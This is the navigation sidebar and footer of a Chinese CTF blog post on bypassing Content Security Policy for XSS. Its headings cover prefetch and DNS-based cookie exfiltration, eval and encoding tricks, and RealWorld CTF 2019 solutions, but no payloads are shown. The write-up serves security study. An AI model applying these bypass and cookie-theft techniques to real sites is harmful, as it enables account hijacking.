nav-level-5"><a class="nav-link" href="#在没有过滤的条件下我们可以这样"><span class="nav-number">1.6.3.</span> <span class="nav-text">在没有过滤的条件下我们可以这样</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤了点"><span class="nav-number">1.7.</span> <span class="nav-text">过滤了点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Google-CTF-2016-Wallowing-Wallabies-Part-Three"><span class="nav-number">1.7.1.</span> <span class="nav-text">Google CTF 2016 Wallowing Wallabies - Part Three</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤了所有的点，属性的点可以用-‘’-的形式来代替，URL-我们可以用-String-fromCharCode-函数，所以最后的-payload-是"><span class="nav-number">1.7.2.</span> <span class="nav-text">过滤了所有的点，属性的点可以用 [‘’] 的形式来代替，URL 我们可以用 String.fromCharCode 函数，所以最后的 payload 是</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤了大部分关键字"><span class="nav-number">1.8.</span> <span class="nav-text">过滤了大部分关键字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ZCTF-2017-中就碰到了这样一道题。"><span class="nav-number">1.8.1.</span> <span class="nav-text">ZCTF 2017 中就碰到了这样一道题。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的-Twitter-中的一个-payload"><span class="nav-number">1.9.</span> <span class="nav-text">这些常见的关键字都被拦截了，所以考虑一些冷门的发起请求的方法，搜到了长短短的 Twitter 中的一个 payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#因为我们不用获取-Cookie，所以完全可以实现我们的要求"><span class="nav-number">1.9.1.</span> <span class="nav-text">因为我们不用获取 Cookie，所以完全可以实现我们的要求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PS：-sourceMappingURL-是用来请求一个-map-文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试"><span class="nav-number">1.9.2.</span> <span class="nav-text">PS：//# sourceMappingURL 是用来请求一个 .map 文件，实现代码出错时直接显示原始代码，而不是经过压缩或其他转换操作后的代码，方便开发者调试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#还有就是这个指令值出现在-style-src-中"><span class="nav-number">1.9.3.</span> <span class="nav-text">还有就是这个指令值出现在 style-src 中</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pwnhub-蓝猫师傅出的一道题-打开电脑，-CSP-是长这样的"><span class="nav-number">1.10.</span> <span class="nav-text">Pwnhub 蓝猫师傅出的一道题 打开电脑， CSP 是长这样的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#我们可以提交一条-md5-值，后台显示方式和前段差不多，即"><span class="nav-number">1.11.</span> <span class="nav-text">我们可以提交一条 md5 值，后台显示方式和前段差不多，即</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#因为有-htmlspecialchars，对-lt-“-进行了转义，即我们跳不出这个标签，所以不能用-script-标签，但是我们注意到-hexdata-是没有引号的，而且这个字段又是我们可控的，结合-style-src-的-unsafe-inline-值，可以在标签内使用内联样式"><span class="nav-number">1.11.1.</span> <span class="nav-text">因为有 htmlspecialchars，对 &lt; “ 进行了转义，即我们跳不出这个标签，所以不能用 script 标签，但是我们注意到 hexdata 是没有引号的，而且这个字段又是我们可控的，结合 style-src 的 unsafe-inline 值，可以在标签内使用内联样式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#background-image-属性是用来为元素设置背景图像的"><span class="nav-number">1.11.2.</span> <span class="nav-text">background-image 属性是用来为元素设置背景图像的</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unsafe-eval"><span class="nav-number">1.12.</span> <span class="nav-text">unsafe-eval</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#当上面的-unsafe-inline-和-unsafe-eval-都开启时，将会变得很危险"><span class="nav-number">1.12.1.</span> <span class="nav-text">当上面的 unsafe-inline 和 unsafe-eval 都开启时，将会变得很危险</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为你过滤的一些关键字都可以用-eval-函数来绕过，比如"><span class="nav-number">1.12.2.</span> <span class="nav-text">因为你过滤的一些关键字都可以用 eval 函数来绕过，比如</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们先对最基本的-payload-用-String-fromCharCode-函数来处理"><span class="nav-number">1.12.3.</span> <span class="nav-text">我们先对最基本的 payload 用 String.fromCharCode 函数来处理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#再用-eval-函数执行"><span class="nav-number">1.12.4.</span> <span class="nav-text">再用 eval 函数执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这样就避开了很多关键字，当然不保证会直接过滤掉-eval"><span class="nav-number">1.12.5.</span> <span class="nav-text">这样就避开了很多关键字，当然不保证会直接过滤掉 eval</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Link-Prefetch"><span class="nav-number">1.13.</span> <span class="nav-text">Link Prefetch</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在-HTML5-中有一个新特性，Link-Prefetch-页面资源预加载-，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度"><span class="nav-number">1.13.1.</span> <span class="nav-text">在 HTML5 中有一个新特性，Link Prefetch(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#官方的定义"><span class="nav-number">1.13.2.</span> <span class="nav-text">官方的定义</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面就说下几种可以实现预加载的方式"><span class="nav-number">1.13.3.</span> <span class="nav-text">下面就说下几种可以实现预加载的方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#prefetch"><span class="nav-number">1.14.</span> <span class="nav-text">prefetch</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一般是通过-link-标签来实现预加载的指令"><span class="nav-number">1.14.1.</span> <span class="nav-text">一般是通过 link 标签来实现预加载的指令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是在标签内的话是没办法打到-Cookie-的，但如果我们可以执行内联-JS，情况就不一样了"><span class="nav-number">1.14.2.</span> <span class="nav-text">但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果-CSP-头是这样的，我们可以通过利用-JS-创建-link-标签的方式打到-Cookie"><span class="nav-number">1.14.3.</span> <span class="nav-text">如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dns-prefetch"><span class="nav-number">1.15.</span> <span class="nav-text">dns-prefetch</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dns-prefetch-DNS预解析-允许浏览器在后台提前将资源的域名转换为-IP-地址，当用户访问该资源时就可以加快-DNS-解析。"><span class="nav-number">1.15.1.</span> <span class="nav-text">dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#同样想要在"><span class="nav-number">1.15.2.</span> <span class="nav-text">同样想要在</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这种情况下收获-Cookie-的话"><span class="nav-number">1.15.3.</span> <span class="nav-text">这种情况下收获 Cookie 的话</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为域名的命名规则是-a-zA-Z0-9-，所以需要对一些特殊字符进行替换"><span class="nav-number">1.15.4.</span> <span class="nav-text">因为域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然后到-ns-服务器上获取-DNS-查询记录就可以了，我用的是这个平台"><span class="nav-number">1.15.5.</span> <span class="nav-text">然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个平台</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preconnect"><span class="nav-number">1.16.</span> <span class="nav-text">preconnect</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#preconnect-预连接-，与-DNS预解析-类似，但它不仅完成-DNS-预解析，还进行-TCP-握手和-TLS-协商"><span class="nav-number">1.16.1.</span> <span class="nav-text">preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用方式和上面类似"><span class="nav-number">1.16.2.</span> <span class="nav-text">利用方式和上面类似</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preload"><span class="nav-number">1.17.</span> <span class="nav-text">preload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#preload-是一个新的-web-标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而-prefetch-以低优先权取回下一个页面的资源"><span class="nav-number">1.17.1.</span> <span class="nav-text">preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#和其他属性值不同的是，它是由-connect-src-决定的，只有-CSP-长下面这样时才会对-href-里的资源发起请求"><span class="nav-number">1.17.2.</span> <span class="nav-text">和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然后就是和上面类似的-payload-了"><span class="nav-number">1.17.3.</span> <span class="nav-text">然后就是和上面类似的 payload 了</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#prerender"><span class="nav-number">1.18.</span> <span class="nav-text">prerender</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#测试了下好像已经不行了，没有-CSP-头也不行"><span class="nav-number">1.18.1.</span> <span class="nav-text">测试了下好像已经不行了，没有 CSP 头也不行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#302-Redirect-Bypass"><span class="nav-number">1.18.2.</span> <span class="nav-text">302 Redirect Bypass</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接"><span class="nav-number">1.18.3.</span> <span class="nav-text">很多种情况下网站会有302重定向的页面，用来跳转到本站的其他资源或者外部链接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在-PHP-中一般这样来实现"><span class="nav-number">1.18.4.</span> <span class="nav-text">在 PHP 中一般这样来实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们看下官方的说明"><span class="nav-number">1.18.5.</span> <span class="nav-text">我们看下官方的说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#也就是说只要产生跳转的页面在-CSP-下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的"><span class="nav-number">1.18.6.</span> <span class="nav-text">也就是说只要产生跳转的页面在 CSP 下是可以访问的，那么就能实现跳转到其他页面，当然，这个页面得是和产生跳转的页面同域下的</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上面总结了CSP的用法和他的一般绕过下面是一些实例："><span class="nav-number">1.19.</span> <span class="nav-text">上面总结了CSP的用法和他的一般绕过下面是一些实例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#realWorld-CTF2019的Mission-Invisible"><span class="nav-number">1.20.</span> <span class="nav-text">realWorld CTF2019的Mission Invisible</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目源码："><span class="nav-number">1.20.1.</span> <span class="nav-text">题目源码：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目源码的分析如下："><span class="nav-number">1.21.</span> <span class="nav-text">题目源码的分析如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最后的payload："><span class="nav-number">1.22.</span> <span class="nav-text">最后的payload：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#realWorld-CTF2019的hCorem："><span class="nav-number">1.23.</span> <span class="nav-text">realWorld CTF2019的hCorem：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目介绍："><span class="nav-number">1.24.</span> <span class="nav-text">题目介绍：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#hCorem是利用易受攻击的脚本来注入XSS并检索最新浏览器的Cookie（Chrome-v77-0-3865-75）"><span class="nav-number">1.24.1.</span> <span class="nav-text">hCorem是利用易受攻击的脚本来注入XSS并检索最新浏览器的Cookie（Chrome v77.0.3865.75）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#提供了包含构建任务的Docker容器所需的文件的归档文件。它包含以下文件："><span class="nav-number">1.24.2.</span> <span class="nav-text">提供了包含构建任务的Docker容器所需的文件的归档文件。它包含以下文件：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#源码分析："><span class="nav-number">1.25.</span> <span class="nav-text">源码分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#源代码包含3个文件。代码简单明了，相对容易找到该漏洞："><span class="nav-number">1.25.1.</span> <span class="nav-text">源代码包含3个文件。代码简单明了，相对容易找到该漏洞：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#访问页面-api-php-qwq-callback-foobar将打印foobar-…-，从而导致XSS漏洞。"><span class="nav-number">1.25.2.</span> <span class="nav-text">访问页面/api.php/qwq?callback=foobar将打印foobar({…})，从而导致XSS漏洞。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安全机制："><span class="nav-number">1.26.</span> <span class="nav-text">安全机制：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#前两个标头可以防止xss被利用。"><span class="nav-number">1.26.1.</span> <span class="nav-text">前两个标头可以防止xss被利用。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内容安全政策："><span class="nav-number">1.27.</span> <span class="nav-text">内容安全政策：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Content-Security-Policy-CSP-标头设置为：-default-src-39-self-39-object-src-39-none-39-base-uri-39-none-39"><span class="nav-number">1.27.1.</span> <span class="nav-text">Content-Security-Policy(CSP)标头设置为： default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这意味着资源只能从同一域-self-加载，除了根本无法加载的对象。"><span class="nav-number">1.27.2.</span> <span class="nav-text">这意味着资源只能从同一域(self)加载，除了根本无法加载的对象。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CSP的绕过是要再次包含API。以下有效负载将在Firefox上显示一个警告框（其中没有第二种保护）："><span class="nav-number">1.27.3.</span> <span class="nav-text">CSP的绕过是要再次包含API。以下有效负载将在Firefox上显示一个警告框（其中没有第二种保护）：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#X-XSS保护"><span class="nav-number">1.28.</span> <span class="nav-text">X-XSS保护</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#X-XSS-Protection标头设置为：-1-mode-block"><span class="nav-number">1.28.1.</span> <span class="nav-text">X-XSS-Protection标头设置为： 1; mode=block</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这会告诉Chrome以阻止模式启用XSS-Auditor。"><span class="nav-number">1.28.2.</span> <span class="nav-text">这会告诉Chrome以阻止模式启用XSS Auditor。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XSS-Auditor是一种防止反射的XSS攻击的功能：如果-lt-script-gt-…-GET-POST变量和正文中都存在XSS-Auditor-，则浏览器会将请求识别为利用反射的XSS并将阻止页面。"><span class="nav-number">1.28.3.</span> <span class="nav-text">XSS Auditor是一种防止反射的XSS攻击的功能：如果&lt;script&gt;… GET / POST变量和正文中都存在XSS Auditor ，则浏览器会将请求识别为利用反射的XSS并将阻止页面。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们必须绕过XSS-Auditor的想法之一是通过指定不同的编码来欺骗浏览器。这个想法是由任务的名称（支持hCorem其Chrome在中端拼写）"><span class="nav-number">1.28.4.</span> <span class="nav-text">我们必须绕过XSS Auditor的想法之一是通过指定不同的编码来欺骗浏览器。这个想法是由任务的名称（支持hCorem其Chrome在中端拼写）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE："><span class="nav-number">1.28.5.</span> <span class="nav-text">通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：-1"><span class="nav-number">1.28.6.</span> <span class="nav-text">通过在文档前放置字节顺序标记（BOM），可以将页面的编码更改为UTF-8，UTF-16BE或UTF16-LE：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#资料来源：编码，生活标准§6。标准挂钩"><span class="nav-number">1.28.7.</span> <span class="nav-text">资料来源：编码，生活标准§6。标准挂钩</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#以下有效负载（未经URL编码以提高可读性）绕过XSS审核程序并触发警报："><span class="nav-number">1.28.8.</span> <span class="nav-text">以下有效负载（未经URL编码以提高可读性）绕过XSS审核程序并触发警报：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#两者结合"><span class="nav-number">1.28.9.</span> <span class="nav-text">两者结合</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过结合在前两个部分中找到的技巧，可以执行JavaScript代码："><span class="nav-number">1.28.10.</span> <span class="nav-text">通过结合在前两个部分中找到的技巧，可以执行JavaScript代码：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取cookie："><span class="nav-number">1.29.</span> <span class="nav-text">获取cookie：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#该任务的目标是检索无头浏览器的cookie。"><span class="nav-number">1.29.1.</span> <span class="nav-text">该任务的目标是检索无头浏览器的cookie。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#检索它们的最简单方法是使用重定向浏览器-document-location-href。与AJAX调用不同，此重定向不受CSP约束。"><span class="nav-number">1.29.2.</span> <span class="nav-text">检索它们的最简单方法是使用重定向浏览器 document.location.href。与AJAX调用不同，此重定向不受CSP约束。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用于窃取Cookie的有效负载如下："><span class="nav-number">1.29.3.</span> <span class="nav-text">用于窃取Cookie的有效负载如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过查看服务器的日志找到Cookie："><span class="nav-number">1.29.4.</span> <span class="nav-text">通过查看服务器的日志找到Cookie：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最终的payload："><span class="nav-number">1.30.</span> <span class="nav-text">最终的payload：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hcorme的解法2："><span class="nav-number">1.31.</span> <span class="nav-text">Hcorme的解法2：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目说明："><span class="nav-number">1.32.</span> <span class="nav-text">题目说明：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#首先题目有一个callback的接口，能够把请求参数输出，并且是text-html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript。"><span class="nav-number">1.32.1.</span> <span class="nav-text">首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#与此同时有两个难点就是XSS-Auditor限制和CSP的限制："><span class="nav-number">1.32.2.</span> <span class="nav-text">与此同时有两个难点就是XSS Auditor限制和CSP的限制：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题思路："><span class="nav-number">1.33.</span> <span class="nav-text">解题思路：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-bypass-auditor："><span class="nav-number">1.33.1.</span> <span class="nav-text">1.bypass auditor：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用utf-16编码绕过："><span class="nav-number">1.33.2.</span> <span class="nav-text">用utf-16编码绕过：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#这里先介绍一下-xx-xx这类url编码，他是16进制表示的："><span class="nav-number">1.34.</span> <span class="nav-text">这里先介绍一下%xx%xx这类url编码，他是16进制表示的：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#utf-8表示"><span class="nav-number">1.34.1.</span> <span class="nav-text">utf-8表示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#输出-E6-9D-B0"><span class="nav-number">1.34.2.</span> <span class="nav-text">输出%E6%9D%B0</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#那么这个”杰-quot-用utf-8编码就是0xe6-0x9d-0xb0，下面是utf-16下的”杰-quot-的表示："><span class="nav-number">1.34.3.</span> <span class="nav-text">那么这个”杰&quot;用utf-8编码就是0xe6 0x9d 0xb0，下面是utf-16下的”杰&quot;的表示：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#输出-FF-FEpg："><span class="nav-number">1.34.4.</span> <span class="nav-text">输出%FF%FEpg：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你会发现无论用utf-16编码什么字符前两个字节都是-FF-FE："><span class="nav-number">1.34.5.</span> <span class="nav-text">你会发现无论用utf-16编码什么字符前两个字节都是%FF%FE：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为在UTF-16文件的开首，都会放置一个U-FEFF字符作为Byte-Order-Mark（UTF-16LE以FF-FE代表，UTF-16BE以FE-FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。"><span class="nav-number">1.34.6.</span> <span class="nav-text">因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过Bypass-XSS-Auditor"><span class="nav-number">1.35.</span> <span class="nav-text">绕过Bypass XSS Auditor</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#可以发现成功插入标签但是是不可能执行的由于有CSP的保护。"><span class="nav-number">1.35.1.</span> <span class="nav-text">可以发现成功插入标签但是是不可能执行的由于有CSP的保护。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以用上面的方法直接绕过，因为CSP是内容安全策略，是定义资源加载安全的。"><span class="nav-number">1.35.2.</span> <span class="nav-text">可以用上面的方法直接绕过，因为CSP是内容安全策略，是定义资源加载安全的。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因此可以用跳转绕过。"><span class="nav-number">1.35.3.</span> <span class="nav-text">因此可以用跳转绕过。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#还有可以用jsonp的方式把js代码挂载到本地绕过。"><span class="nav-number">1.35.4.</span> <span class="nav-text">还有可以用jsonp的方式把js代码挂载到本地绕过。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以参考ins’hack-2019-的bypasses-everywhere"><span class="nav-number">1.35.5.</span> <span class="nav-text">可以参考ins’hack 2019/的bypasses-everywhere</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试payload："><span class="nav-number">1.36.</span> <span class="nav-text">测试payload：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#进行了两次资源请求，第二次的资源的执行类型是script。"><span class="nav-number">1.36.1.</span> <span class="nav-text">进行了两次资源请求，第二次的资源的执行类型是script。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#接着就是把flag打到自己的服务器就行了。"><span class="nav-number">1.37.</span> <span class="nav-text">接着就是把flag打到自己的服务器就行了。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结完这两个题有一个感受："><span class="nav-number">1.38.</span> <span class="nav-text">总结完这两个题有一个感受：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#纸上得来终觉浅，绝知此事要躬行。"><span class="nav-number">1.38.1.</span> <span class="nav-text">纸上得来终觉浅，绝知此事要躬行。</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">145.9k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
